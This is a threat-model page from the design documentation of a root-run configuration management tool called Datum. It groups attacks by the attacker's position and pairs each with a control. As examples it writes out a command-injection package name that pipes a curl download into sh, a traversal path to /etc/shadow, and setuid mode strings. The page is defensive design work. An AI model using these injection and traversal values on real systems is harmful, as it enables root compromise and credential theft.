# Threat model

Vectors are grouped by what the attacker can already do, because that is what decides which
controls are available. Each one records the impact and the design's position, using the
labels from [project status](../introduction/project-status.md).

## An attacker who can merge to the repository

**Arbitrary root execution across the fleet.** A merged change reaches every host it matches,
applied by an agent running as root. No further control sits between the merge and the host.

Mitigation is entirely outside Datum, being branch protection, required review, and restricting who
can approve. The design's contribution is that the change is a readable diff of declared state, not
a script, so review has something reviewable, and that provenance makes it possible to ask
afterwards which layer introduced a value.

**A commit that never went through review.** Whoever controls the Git remote, or an attacker
holding an account on the Git server with push rights, can place a commit on the tracked branch directly.
Transport authentication does not help, because the commit arrives over a legitimate
connection.

The control is signature verification on the agent, which moves trust from the Git server to a key.
It is the only control that constrains a repository writer, and it is specified under
[trusting desired state](repository-trust.md#verifying-that-a-revision-is-genuine), including
the `signed-tag` mode that avoids requiring every commit to be signed.

**Replaying an old revision.** A valid, signed, older commit reintroduces a vulnerability that
was fixed. Signature verification alone does not catch this, because the old commit is
genuinely signed.

The control is the descendant requirement described under [verifying that a revision is
current](repository-trust.md#verifying-that-a-revision-is-current). The agent records the
revision it last applied and refuses anything that is not a descendant of it, so Git's own
history supplies the ordering.

The residual gap is first contact, because a host with no recorded revision has nothing to compare
against and accepts whatever signed revision it sees first. Closing that belongs to provisioning,
not to the agent.

**A change that is root-equivalent and reviews cleanly.** Merging is already the strongest position
here, and the entry above assumes review is the control. This entry is about the changes review does
not catch because they look routine.

```text
mode: "04755"          on a binary, is a setuid root grant
mode: "0666"           on a file under /etc, is a root grant one step later
a widened matcher      moves a layer onto hosts nobody intended
a File in sudoers.d    is a root grant expressed as a configuration file
```

The first two are [refused unless the resource says `allowPrivileged:
true`](provider-safety.md#modes-that-grant-privilege), which turns a four-character change into a
stated intent. A widened matcher is visible in [`datum
affected`](../repository/validating-changes.md#which-hosts-a-change-would-affect), which reports the
host count a change reaches and is the reason that command exists. The last one is permitted, is not
distinguishable from legitimate configuration, and is [the limit of what any of this
defends](repository-trust.md#routes-other-than-the-filesystem).

Homoglyph and bidirectional-text tricks are the version of this aimed at the reviewer instead of the
system, and field values are [normalised and
refused](provider-safety.md#field-validation-happens-when-the-manifest-loads) so that what renders
in a diff is what compares.

**Pushing a tag without merging anything.** Under
[`signed-tag`](repository-trust.md#choosing-among-signed-tags) the fleet applies the revision a signed
tag names, so tag creation is part of the trust boundary and tag push permissions are frequently less
protected than merges.

Creating a tag is not sufficient on its own, because a candidate has to be an annotated tag signed
by a trusted key. What tag permissions do grant is the ability to move the fleet between revisions
that are already signed, which is bounded by the [descendant
requirement](repository-trust.md#verifying-that-a-revision-is-current) and needs protecting on the
Git server alongside the branch.

**Pinning the fleet by breaking resolution.** A change that resolves nowhere, through a dependency
cycle, a duplicate target identity or an undefined label in a substitution, leaves every matched host
on [last known good](../reconciliation/last-known-good.md) indefinitely. No security fix reaches those
hosts until somebody notices.

That is denial of service achieved by a change that needs no special privilege beyond the ability to
land a commit, and the control is that
[`datum validate` rejects exactly what an agent rejects](../repository/validating-changes.md#datum-validate),
so CI catches it before the merge. Where it lands anyway, the
[bad-revision alert](../observability/alerting.md#alerts-worth-having) fires on every affected host.

**A repository expensive enough to stall every agent.** Resolution cost is paid per host, so one commit
can make every pass in the fleet slow without any individual limit being exceeded. The
[fetch and size limits](repository-fetch.md#limits) bound the input, the
[pass timeout](../reconciliation/failure-handling.md#a-pass-is-bounded) bounds the consequence, and
what bounds resolution itself is an open question.

## An attacker who can read the repository

**Fleet-wide configuration disclosure.** Reading the repository reveals the configuration of
every host, including file contents, package sets, user accounts and the structure of the
estate.

Every managed host has this capability, so compromising the least important machine in the fleet
discloses the configuration of the most important one. Narrowing it would mean resolving manifests
away from the host, which [Datum does not do](../architecture/deployment-models.md).

**Credential theft from a host.** The repository credential sits on disk on every host. Stealing
one from anywhere grants repository read access from anywhere.

Credentials are read-only, root-owned at mode `0600`, and per-host so that one can be revoked
without touching the fleet, which is specified under [repository
credentials](repository-trust.md#repository-credentials).

That limits who can use a stolen credential, not what it grants. Per-host credentials are a
mitigation, not a fix.

## An attacker with root on one managed host

**Lying about observed state.** The agent runs on the host, so it can report anything. Datum
will then apply changes that are not needed or skip changes that are.

The impact is bounded to that machine, and the important consequence is for reporting, not for
configuration. A converged status from a host is a claim made by that host, so a green fleet report
is not evidence of compliance. Treating it as an attestation would be wrong, and no part of the
design attempts to make it one.

**Preventing reconciliation.** Stopping the agent, blocking its network access or corrupting its
configuration all stop that host converging. Detection depends on noticing the absence of reports
instead of receiving a bad one, which is a monitoring property Datum does not currently provide.

**Resetting downgrade protection.** The
[accepted revision](repository-trust.md#verifying-that-a-revision-is-current) lives in the state
directory. Clearing or rewriting it lets the host accept an older signed revision, which reintroduces
whatever that revision contained, persistently and with no signing key required.

Nothing prevents this. Local root owns the machine, and
[ADR-0010](../adr/0010-no-self-managed-trust-anchors.md) protects the state directory from *desired
state*, not from the host's own administrator. What exists instead is detection, since the agent
[refuses to run on a mis-permissioned state
directory](provider-safety.md#reports-and-content-disclosure) and reports both the revision it
accepted and [whether it had a baseline at all](../observability/metrics.md#security-controls), so a
reset is visible from outside the host even though it cannot be stopped on it.

**Moving the clock.** Signature freshness, credential expiry and every timestamp metric are computed
from a clock the host controls. A host set forward looks permanently fresh to the
[staleness alert](../observability/alerting.md#a-host-that-stops-reconciling-is-the-failure-to-catch),
which is the alert most relied on.

The design prefers [ordering over wall-clock time](time.md) wherever it can, and the residual case
is handled by the scrape and not by the host, because a collector records when it collected and that
timestamp is not the host's to move.

**Reading secrets the host can resolve.** An agent holds whatever credential its
[secret backend](../resources/secrets.md#where-the-value-comes-from) requires, so root on the host can
resolve every secret that credential permits. Narrowing that is the backend's job and the reference in
desired state is what gives a backend something to authorise against.

**Claiming another host's identity.** This gains nothing, because the host already reads the
whole repository. Identity selects which configuration to apply and grants no access.

## An attacker with an unprivileged account on a managed host

This position is the most frequently overlooked, and it is where a root-privileged agent is most
dangerous. Every item here is a requirement on providers, not a design position.

**Symlink substitution at a managed path.** Datum writes a file as root. An unprivileged user who
can create entries in the target directory replaces the target with a symlink to `/etc/shadow`,
and root follows it.

The directory does not have to be world-writable for this to matter. Any path under a directory
owned by a service account, which is common under `/var/lib` and `/srv`, is reachable by whoever
controls that account.

The control is specified under [resolving a managed
path](provider-safety.md#resolving-a-managed-path) and [writing a
file](provider-safety.md#writing-a-file). The final component is opened with `O_NOFOLLOW`, the
temporary file is created in the target directory with `O_EXCL`, and ownership and mode are set
on the descriptor before any content is written.

**Substitution between observation and apply.** Observation reads a path and the planner decides
an update is needed. The path is replaced before the reconciler writes.

The control is to resolve the path once per pass and hold the parent directory as a file descriptor,
then confirm at apply time that the descriptor still refers to the device and inode recorded during
observation. A descriptor cannot be redirected the way a re-resolved path string can, so this
prevents the substitution rather than detecting it afterwards.

Verification still catches anything that slips through, because the affected resource is read
again and will not match.

**Hard links to files the attacker cannot read.** An unprivileged user creates a hard link, in a
directory they control, to a file they have no access to. A `File` or `Directory` resource that
then changes ownership or mode on that path grants them access to the original.

The control is to refuse a metadata-only change on a path whose link count is greater than one, and
to report the refusal instead of proceeding, as specified under [hard
links](provider-safety.md#hard-links). Managing the file's content makes the case safe, because a
rename breaks the link instead of following it.

**Reading reports and plans.** A plan can contain file content, and a report written
world-readable hands it to any local user.

Reports live under the agent's state directory at mode `0600` inside a `0700` directory, both
root-owned, and content is recorded as a digest, never as text. A file can additionally be marked
`sensitive` so its content is never rendered at all. Both are specified under [reports and content
disclosure](provider-safety.md#reports-and-content-disclosure).

## An attacker who controls resource field values

This overlaps with repository write access and is listed separately because the controls are
implementation rules, not process.

**Command injection through a field.** A package name of `nginx; curl http://host/x | sh` reaches
a provider. If the provider builds a shell string, that runs as root.

The control is the [no shell rule](provider-safety.md#no-shell). Providers invoke an
argument vector directly, so a field value is one argument and cannot be interpreted as syntax.
Nothing above the provider boundary executes anything at all.

**Field values that are syntactically valid and semantically wrong.** A package name containing a
path separator, a unit name containing a slash, or a sysctl key containing `..` can reach tooling
that interprets them.

The control is [validation when the manifest
loads](provider-safety.md#field-validation-happens-when-the-manifest-loads), which rejects
dangerous character classes universally and leaves distribution-specific name rules to
providers. A failing value is a manifest error raised before the host is read.

**Path traversal through a content source.** A `File.desired.source` of `../../../../etc/shadow`
would read outside the repository and write its contents to a host.

The control is [source confinement](provider-safety.md#confining-content-sources). A source path
must be relative, resolves against its layer directory, and the result has to remain inside the
fleet root with symbolic links resolved before that check and not after.

## An attacker who can reach the metrics endpoint

**Reconnaissance from host metrics.** The [metrics
endpoint](../observability/metrics.md#binding-and-exposure) discloses the revision and manifest
digest a host is running, its state, and its resource counts. An attacker reading it learns which
hosts are behind on configuration, which is precisely the set an attacker wants, and learns the
shape of the estate without touching anything.

The control is that the endpoint binds to loopback by default, so exposing it is a decision and not
something inherited, and that it carries no file content, field values or credentials. Whether it
should support TLS and authentication when exposed is an open question.

**Load induced through scraping.** A scrape returns values recorded by the last pass and never reads
the host or the repository, so an attacker cannot turn a scrape storm into a fleet-wide read of
every managed path. That follows from the endpoint being a projection of recorded state, not a live
query.

## A compromised provider or extension

[Extensions are load-bearing](../adr/0011-no-command-execution-from-desired-state.md), because they are
the only route for anything the shipped types do not model, and an extension is unsandboxed code running
as root.

**An extension doing more than its type describes.** Nothing constrains it. It runs out of process,
which means a crash fails one resource rather than the pass, and out of process is not a privilege
boundary when both processes are root.

The control is that installing one is a privileged operation performed outside desired state, so a
repository cannot both introduce code and cause it to run. That makes extension installation as
consequential as installing the agent, and how extensions are built, signed and distributed is
[the largest gap this creates](../resources/applications.md#extensions).

**An extension reading what it was not given.** A provider receives one resource and
[no view of the manifest beyond it](../architecture/components.md), and nothing enforces that. An
extension can read the repository checkout, the credential and the secret backend, because it runs as
root on a host where all three are present.

**A compromised agent package.** The agent and its bundled providers arrive by whatever installed
them, and a tampered package is fleet-wide root. This is the highest-impact vector in the system
after repository merge, it is [explicitly not defended](index.md#what-is-not-defended), and closing
it is build provenance and package signing, not anything Datum does at runtime.

## An attacker who can write to the host's own filesystem

Distinct from having root, because these are routes an unprivileged process reaches.

**Injection into logs, reports and metrics.** Repository-controlled strings reach structured logs, metric
label values and rendered plans. A path or a name containing quotes, braces or terminal escape sequences
could corrupt a log pipeline, break the exposition format, or misrepresent a plan an operator is reading
before approving it.

Field values are [restricted to an allowed character
set](provider-safety.md#field-validation-happens-when-the-manifest-loads) instead of filtered at
each sink, and metric label values carry only revisions and digests. Terminal escape sequences are
stripped from anything rendered interactively, because a plan that lies about what it will do
defeats the point of having one.

**Filling the filesystem during apply.** Content is staged in the target directory, so a large
`File` consumes space where it matters most. [`source.maxSourceSize`](repository-fetch.md#limits)
bounds one resource and free space is checked before staging, so the failure is a refused resource,
not a full root filesystem.

## An attacker racing a pass outside the filesystem

[Path substitution](#an-attacker-with-an-unprivileged-account-on-a-managed-host) is the filesystem case
and the same shape exists wherever observation and apply are separated.

```text
package removed between observe and apply     the planned action no longer fits
a concurrent useradd                          the user database changes underneath
an administrator editing a managed file       verification fails with no real cause
```

Observation is a snapshot, and a provider is required to declare the locking discipline its
subsystem offers and to use it, meaning the distribution's package lock and the user database lock
rather than optimism. An action whose precondition has changed is refused and reported, never
forced.

Datum's own [pass lock](../reconciliation/locking.md) covers Datum against Datum and nothing else, so a
second configuration management tool on the same host is outside what any of this addresses.

## An attacker on the network

**Interception between agent and Git remote.** Mitigated by transport authentication, which the
design assumes is working. Commit signature verification would make interception insufficient on
its own, because modified content would not verify.

**A malicious remote attacking the Git client.** Parsing happens before verification can, so
signature checking does not help here. A hostile remote is attacking a parser, and the exposure is
bounded by the remote being [a configured address, not a discovered
one](../lifecycle/installation.md#the-repository-url-is-configuration-not-discovery) and by the
[fetch limits](repository-fetch.md#limits).

**Execution through the checkout itself.** Submodules, `.gitattributes` filters, `textconv` and hooks all
cause a Git client to run commands on the repository's instruction, which would defeat
[ADR-0011](../adr/0011-no-command-execution-from-desired-state.md) without a single resource document
being involved. All four are [disabled](repository-fetch.md#checkout-is-hardened).

**Credential exposure from the agent process.** The agent is a long-lived root process holding a
repository credential and possibly a secret-backend credential. Credentials are passed to a
subprocess by descriptor, not in an argument vector or the environment, so they do not appear in
`/proc`, core dumps are disabled in the shipped service unit, and fetch error output is redacted
before it reaches a report.

## An attacker who controls upstream content

**A package repository Datum was told to trust.** A `File` resource writing a sources list adds a
third-party repository, after which the package manager installs and trusts whatever it serves.
The result is root execution, arranged entirely through a legitimate-looking configuration file.

This needs stating because adding a repository looks like an ordinary file change in review. It is
also the main security consideration behind a future `Repository` resource type, which would at
least make the intent explicit and reviewable as its own thing instead of as a file containing a
URL.

**Package content itself.** Signature verification is the distribution's, not Datum's. A
repository whose signing key is configured and trusted produces packages Datum installs without
further question.

## Quietly stopping being managed

**Narrowing what a host is told to do.** Removing a `Host` document, narrowing a matcher or deleting a
security-relevant layer causes a host to converge happily on a smaller manifest.
[Declared-only ownership](../adr/0009-declared-only-ownership.md) guarantees nothing is removed, so the
host reports `converged` while an ssh-hardening or audit layer is simply no longer enforced.

This is the failure mode that looks most like success. Every signal is green, because the host is doing
everything it was asked to do, and what changed is what it was asked.

The controls are that [`datum
affected`](../repository/validating-changes.md#which-hosts-a-change-would-affect) reports a manifest
digest change whether the manifest grew or shrank, that resource counts are exposed so a drop is
visible, and that [an unmatched layer should be
reported](../repository/index.md#keeping-a-repository-from-accumulating-unused-content). None of
them is a guarantee, and a fleet that does not look at resource counts will not notice.

**A host that was never enrolled.** An installed but unenrolled machine
[does nothing and says nothing](../lifecycle/enrolment.md#machines-that-never-enrol), and Datum cannot
distinguish it from a machine nobody intended to manage. Closing that needs an inventory of machines that
are supposed to exist, which is outside what Datum can verify.

## Not modelled

Denial of service against a host by its own configuration is not treated as an attack. A matcher
that accidentally matches every host and declares a critical package absent will remove it
everywhere, and that is a blast radius problem, not a security boundary.

Side channels, physical access and hypervisor-level compromise are out of scope.
